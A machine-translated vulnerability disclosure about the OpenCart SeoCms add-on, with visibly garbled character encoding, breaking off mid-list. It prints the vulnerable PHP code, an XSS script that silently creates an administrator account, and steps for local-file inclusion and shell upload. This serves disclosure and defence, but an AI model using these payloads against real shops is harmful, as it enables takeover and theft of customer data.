<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>â†—ï¸ ğŸ‘©ğŸ¾â€ğŸ’» ğŸŒŠ Opencartforum et amis ğŸš¦ ğŸ”³ ğŸ‘©ğŸ¾â€ğŸš€</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Tous les chiens vont au paradis, et tous les propriÃ©taires de boutiques en ligne sur Opencart, tÃ´t ou tard sur Opencartforum. Lorsque l'euphorie de la...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum et amis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="image"><br><br>  Tous les chiens vont au paradis, et tous les propriÃ©taires de boutiques en ligne sur Opencart, tÃ´t ou tard sur Opencartforum.  Lorsque l'euphorie de la premiÃ¨re installation du moteur sur l'hÃ©bergement passe et que la dure rÃ©alitÃ© commence, le propriÃ©taire de magasin typique commence toujours Ã  manquer quelque chose et il commence le chemin difficile de trouver des entrepreneurs qualifiÃ©s et des complÃ©ments de qualitÃ© pour son magasin. <br><br>  La plus grande ressource de Runet, sur laquelle vous pouvez trouver les deux, est opencartforum.com, qui compte aujourd'hui plus de 140 000 utilisateurs enregistrÃ©s.  Sur ces 140 000 inscriptions, la moitiÃ© d'entre elles sont des personnes vivant avec des boutiques en direct qui utilisent des modÃ¨les ou des modules d'une maniÃ¨re ou d'une autre, qui peuvent Ãªtre immÃ©diatement achetÃ©s sur le site.  Et toutes ces personnes ne rÃ©alisent mÃªme pas quâ€™avec les modules complÃ©mentaires, elles acquiÃ¨rent de merveilleuses portes dÃ©robÃ©es et des vulnÃ©rabilitÃ©s, dont nâ€™importe quelle mÃ¨re pirate ne peut que rÃªver. <br><a name="habracut"></a><br>  Bien que sous une forme dÃ©clarative dans les rÃ¨gles de publication des modules complÃ©mentaires dans la boutique du forum, il est Ã©crit en noir et blanc.  Nous avons qadepartment, des personnes spÃ©cialement formÃ©es vÃ©rifient les extensions pour les vulnÃ©rabilitÃ©s. <br><br>  Et ni le forum, en tant que plate-forme qui sert d'intermÃ©diaire entre l'auteur et l'utilisateur final du module complÃ©mentaire, ni les auteurs des modules complÃ©mentaires, comme il s'est avÃ©rÃ©, n'assument aucune responsabilitÃ©. <br>  Comment Ã§a?  Et donc!  Apparemment, historiquement. <br><br>  ModÃ©lisant pour moi-mÃªme les consÃ©quences hypothÃ©tiques des incidents, qui seront discutÃ©es plus tard, mes cheveux sur ma tÃªte se tiennent debout. <br><br>  Imaginez.  Vous Ãªtes un propriÃ©taire de magasin prospÃ¨re, vous n'avez pas dormi la nuit depuis quelques annÃ©es, Ã©crit des textes, grignotÃ© du noir, du blanc, du gris, des pandas combattus, de minusinsk, vous n'avez pas fini votre boisson, attirÃ© 100000 clients, investi dans des positions.  Vos enfants vont dans un bon jardin d'enfants, puis soudainement vos ventes ont diminuÃ© de moitiÃ©, tout simplement parce que votre base avec tous les contacts clients est allÃ©e chez les concurrents.  Ou soudain, vous l'avez complÃ¨tement perdu, car depuis un mois maintenant, votre magasin travaille sur le serveur mysql de quelqu'un d'autre, et vous n'avez mÃªme pas remarquÃ© le changement de kofig, et toutes les sauvegardes sur l'hÃ©bergement ont mal tournÃ©. <br><br>  Ils ont prÃ©sentÃ© leurs sentiments dans une situation similaire, travaillÃ©, travaillÃ© pendant plusieurs annÃ©es, et en un jour, tout est perdu.  Vous dites que cela ne peut pas en Ãªtre ainsi. <br><br>  Mais cela peut Ãªtre trÃ¨s simple.  Il suffit dâ€™acheter un module complÃ©mentaire avec une Â«protectionÂ» de protection non dÃ©clarÃ©e et non dÃ©clarÃ©e contre une utilisation non autorisÃ©e, et vos donnÃ©es peuvent rapidement devenir des Ã©trangers! <br><br><h2>  Premier incident </h2><br>  Il y a six mois, une maintenance prÃ©ventive superficielle d'un magasin a Ã©tÃ© effectuÃ©e lorsque le rapport du scanner Ai-Bol a montrÃ© un Ã©trange avertissement concernant un code Ã©trange dans le module <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SeoCms</a> (plus de 10 000 installations actives). <br><br>  Nous avons commencÃ© Ã  regarder de plus prÃ¨s et il s'est avÃ©rÃ© que cet abracadabra affiche simplement la version de l'add-on: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  C'est bon sauf que: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  il n'est en aucun cas filtrÃ©, et si par accident un script comme celui ci-dessous arrive Ã  la place de la version du client, obtenir un accÃ¨s administrateur Ã  n'importe quel magasin oÃ¹ le module est installÃ© est une question de temps et de technique. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors functionâ€‹ getUrlVarsâ€‹()â€‹ {â€‹ vâ€‹arâ€‹vars=â€‹â€‹[â€‹],â€‹hash,â€‹â€‹hashes=â€‹â€‹nâ€‹ull;â€‹ iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.iâ€‹ndexOf(â€‹"â€‹?"â€‹)â€‹â€‹&amp;&amp; windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹indexOfâ€‹("â€‹&amp;")â€‹)â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.lâ€‹ocationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+ 1)â€‹.â€‹split(â€‹â€‹"&amp;"â€‹); }â€‹â€‹â€‹elseâ€‹iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.â€‹indexOf(â€‹â€‹"?"â€‹))â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.â€‹locationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+â€‹â€‹1â€‹); }â€‹ iâ€‹fâ€‹ â€‹(hâ€‹ashes!â€‹=â€‹nâ€‹ull)â€‹ â€‹{â€‹ fâ€‹orâ€‹â€‹(vâ€‹arâ€‹iâ€‹=â€‹â€‹0;â€‹â€‹iâ€‹&lt;â€‹hashesâ€‹.â€‹lengthâ€‹;â€‹iâ€‹++)â€‹{â€‹ hash=â€‹â€‹hashes[â€‹â€‹i]â€‹.sâ€‹plitâ€‹(â€‹"=")â€‹; vars[â€‹hâ€‹ashâ€‹[0â€‹]â€‹]â€‹â€‹=â€‹hashâ€‹[â€‹1]â€‹; }â€‹ }â€‹ râ€‹eturnâ€‹vars;â€‹ } varâ€‹ url_vars =â€‹ â€‹ getUrlVarsâ€‹(); varâ€‹ token =â€‹ â€‹ url_vars.â€‹ â€‹tokenâ€‹; varâ€‹ host â€‹=â€‹ window.â€‹ â€‹locationâ€‹.â€‹origin;â€‹ varâ€‹action=â€‹â€‹host+â€‹â€‹"â€‹/admin/index.php?route=user/user/add&amp;token="â€‹+â€‹ token;â€‹ document.â€‹ â€‹addEventListenerâ€‹(â€‹"DOMContentLoaded"â€‹,â€‹ â€‹functionâ€‹(â€‹eventâ€‹)â€‹ â€‹{ $â€‹.pâ€‹ost(â€‹â€‹action,â€‹â€‹{â€‹â€‹usernameâ€‹:â€‹â€‹"Hack123"â€‹,â€‹user_group_idâ€‹:â€‹â€‹"1"â€‹, firstnameâ€‹:â€‹"â€‹Lol",â€‹â€‹lastnameâ€‹:â€‹"â€‹Haha"â€‹,â€‹ emailâ€‹:â€‹â€‹"Hack123@Hack123.com"â€‹, password:â€‹â€‹"â€‹1234",â€‹â€‹ confirmâ€‹:â€‹â€‹"1234"â€‹,â€‹ statusâ€‹:â€‹â€‹"1"â€‹â€‹}â€‹â€‹); }); &lt;/script&gt;</span></span></code> </pre><br>  Les dÃ©tails de la situation sont dÃ©crits <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> .  Avis d'administration <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  Probablement la cinquiÃ¨me fois, aprÃ¨s avoir modÃ©lisÃ© ce processus trÃ¨s clairement pour l'administration du forum, il a Ã©tÃ© possible de transmettre la criticitÃ© de la situation. <br><br>  Et l'administration, Ã  son tour, a officiellement informÃ© les utilisateurs de la prÃ©sence de cette vulnÃ©rabilitÃ©, et il semble qu'elle ait mÃªme fait une newsletter aux clients.  Mais ce n'est pas exact. <br><br>  Laissons dans les coulisses les menaces et les Ã©vasions de l'auteur du module complÃ©mentaire et revenons deux mois en arriÃ¨re ... <br><br><h2>  DeuxiÃ¨me incident </h2><br>  Un autre magasin vient pour inspection, dans lequel il y a des frises sauvages jusqu'Ã  3-4 secondes sur chaque page.  Nous commenÃ§ons Ã  dissÃ©quer et Ã  voir dans le dossier avec un cache de 20k + fichiers avec l'extension .php.  Cachez les fichiers avec l'extension php Karl, ce n'est pas un hasard! <br><br>  Nous examinons la structure des donnÃ©es de ces fichiers, et lÃ  encore des morceaux de notre beau module SEOCMS. <br><br>  Et une excellente mÃ©thode: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Ceci est un exemple d'une vulnÃ©rabilitÃ© classique - Local File Include. <br><br>  Il suffit de coder en base64 ../....../config.php et bonjour - require ($ ajax_file);  Et s'il vous plaÃ®t: ici, vous avez les mots de passe de la base de donnÃ©es, et voici le journal des erreurs systÃ¨me, et si mÃªme / etc / pwd est trÃ¨s nÃ©cessaire, bien qu'il soit depuis longtemps hors de propos, eh bien, et si? <br><br>  Et combien d'hÃ©bergeurs et de serveurs avec des paramÃ¨tres par dÃ©faut brillent dans le monde de phpmyadmin?  La moitiÃ©?  Plus? <br><br>  Nous commenÃ§ons Ã  chercher plus loin et que trouvons-nous?  Magnifique code de tÃ©lÃ©chargement d'avatar: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Ce qui tombe parfaitement en erreur lors de la tentative de redimensionnement (et nous montre le chemin complet vers le fichier tÃ©lÃ©chargÃ©), aprÃ¨s le chargement d'une sorte de shell.php.png, puis il est Ã©galement parfaitement exÃ©cutÃ© par la mÃ©thode prÃ©cÃ©dente. <br><br>  VidÃ©o d'exploitation de la vulnÃ©rabilitÃ© (avec sortie d'erreur systÃ¨me php activÃ©e): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  VidÃ©o d'exploitation de la vulnÃ©rabilitÃ© (avec sortie d'erreur du systÃ¨me php dÃ©sactivÃ©e): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  L'analyse du code a Ã©tÃ© rÃ©alisÃ©e sur la version du module 52 en avril 2019. <br><br>  Ã‰tant donnÃ© que l'auteur et l'administration du forum ont Ã©tÃ© informÃ©s aux mÃªmes dates, suffisamment de temps s'est Ã©coulÃ© pour qu'ils prennent toutes les mesures possibles pour informer les acheteurs de l'Ã©limination des vulnÃ©rabilitÃ©s, nous, en toute conscience, pouvons divulguer tous les dÃ©tails. <br><br>  Et Ã  ce moment, quelque chose s'est produit.  Sur le serveur du dÃ©veloppeur se trouvait son propre module.  Mais la vulnÃ©rabilitÃ© n'a pas fonctionnÃ©.  Elle Ã©tait couverte ... Et c'est une grande bizarrerie.  TrÃ¨s gros !!! <br><br>  Et la deuxiÃ¨me bizarrerie de toute cette histoire est que l'opencartforum en la personne de l'administration et du service de contrÃ´le de la qualitÃ© des supplÃ©ments n'a vu ni le premier ni le deuxiÃ¨me incident, et dans les deux cas, lors de la premiÃ¨re notification, il n'a rien trouvÃ© de critique. <br><br>  Bien sÃ»r, il n'y a rien de critique lorsque vos configurations brillent dans le monde.  Il n'y a rien de critique quand une bonne moitiÃ© des commerÃ§ants ne savent pas ce qui se passe sous leur capot.  AprÃ¨s tout, une fois, quelqu'un a mis ce module complÃ©mentaire, et sans mailing, ils ne rÃ©alisent mÃªme pas que toute l'entreprise est directement menacÃ©e. <br><br>  Et s'il y a eu une rÃ©action distincte de l'administration sur le premier incident, alors sur le second, tous les messages avec une mention sont supprimÃ©s.  Et tout cela est couvert par une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">offre de forum</a> , selon laquelle, Ã  propos des ajouts commerciaux, des commentaires peuvent Ãªtre laissÃ©s comme sur les morts - bons ou rien. <br><br>  L'auteur affirme Ã©galement que les erreurs et les trous sont corrigÃ©s, qadepartment a manquÃ© l'add-on Ã  vendre, mais non, les trous ne sont pas corrigÃ©s ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () est toujours lÃ .  L'entrÃ©e est lÃ©gÃ¨rement filtrÃ©e.  Mais la LFI potentielle a vÃ©cu et vit.  Si un peu plus, alors oui, maintenant nous ne pouvons ni charger ni exÃ©cuter le shell.  Mais supposons que nous ayons essayÃ©, fermÃ©, cimentÃ© l'exÃ©cution de tous les scripts sauf index.php, et mÃªme au niveau de la configuration nginx, qui n'est en aucun cas accessible.  Mais quelque part ailleurs, le pirate malÃ©fique a eu l'occasion de mettre un fichier arbitraire dans le dossier cache.  Que va-t-il se passer?  C'est vrai - pour exÃ©cuter du code superflu, gÃ©nÃ©rant un hachage dans la requÃªte get, cela prend deux minutes.  C'est-Ã -dire qu'en fin de compte, c'est un peu comme fermÃ©, mais ce n'est pas comme complÃ¨tement. <br><br>  Eh bien, les petites choses: comment de si belles relations brillaient dans les fichiers de langue: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Et ils brillent ... Vous voulez connaÃ®tre le chemin complet vers la racine du projet.  Trouvez simplement le magasin avec l'affichage d'erreur activÃ© et exÃ©cutez le lien directement vers le fichier de langue. <br><br>  Pour Ã©tudier ce qui peut Ãªtre aprÃ¨s la mise Ã  jour du module complÃ©mentaire en mÃ©gaoctets de lignes de code de l'auteur - il n'y a ni ressources ni dÃ©sir.  Il y a des personnes responsables spÃ©cialement formÃ©es pour cela. <br><br>  Et la cerise sur le gÃ¢teau.  Nous nous souvenons, nous avons un add-on commercial ... Et dans un add-on commercial, nous avons du texte cachÃ© sur la ressource de l'auteur: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Fait intÃ©ressant, au moins l'un des acheteurs de modules complÃ©mentaires connaÃ®t un Å“uf de PÃ¢ques aussi Â«merveilleuxÂ»? <br><br>  Aujourd'hui, le supplÃ©ment est Ã  la fois vendu et vendu.  Les messages contenant des appels pour faire attention Ã  la situation sont simplement supprimÃ©s.  Aucun des acheteurs n'a reÃ§u de notifications d'avertissement concernant le deuxiÃ¨me incident.  Peut-Ãªtre que 20 Ã  30% des utilisateurs de modules complÃ©mentaires ont mis Ã  jour, mais 70% - mÃªme si nous parlons des statistiques officielles de l'auteur sur l'utilisation des modules complÃ©mentaires, ce sont 7000 magasins (en fait, plus - car personne ne sait avec certitude combien de copies ont Ã©tÃ© installÃ©es par des pigistes sur les magasins clients licence Ã©tendue) sont dans une zone de risque Ã©norme. <br><br>  Pour reprendre les mots du baron Munchausen, je ne veux dire qu'une chose: messieurs mis Ã  jour! <br><br><h2>  Pour les clients </h2><br>  Que faire, ceux qui se sont retrouvÃ©s dans ce sous-marin en perdition: <br><br><ul><li>  Ne laissez pas de dÃ©chets sur ftp.  Afficher info.php, adminer.php et toutes les autres poubelles.  Vous ne devriez avoir que index.php et un point. </li><li>  Modifiez rÃ©guliÃ¨rement les mots de passe, tous les mots de passe (ftp, panneau d'administration, base de donnÃ©es).  Et assurez-vous que vous n'avez pas accidentellement de comptes Ã©tranges supplÃ©mentaires. </li><li>  DÃ©sactiver la sortie d'erreur.  Toujours, si vous ne travaillez pas, dÃ©sactivez la sortie d'erreur au niveau de la configuration de l'interprÃ©teur et non dans les paramÃ¨tres du magasin. </li><li>  Oui, je sais que ce n'est pas trÃ¨s faisable, mais vous devriez au moins vous tenir au courant de la mise Ã  jour du code moteur liÃ© Ã  la sÃ©curitÃ©, et idÃ©alement, mettre rÃ©guliÃ¨rement Ã  jour le moteur vers des versions stables. </li><li>  Regardez rÃ©guliÃ¨rement les journaux de visites, il peut y avoir beaucoup de choses intÃ©ressantes.  Suivez les anomalies. </li><li>  Fermez en plus avec un mot de passe ou une restriction sur l'admin ip du magasin et diverses sections vulnÃ©rables, telles que phpmyadmin.  S'il s'agit d'un partage dans lequel phpmyadmin est commun Ã  tous, fuyez cet hÃ©bergement! </li><li>  Si vous utilisez sxd et des utilitaires similaires, renommez-les immÃ©diatement en un jeu de caractÃ¨res alÃ©atoire. </li><li>  Lorsque vous utilisez 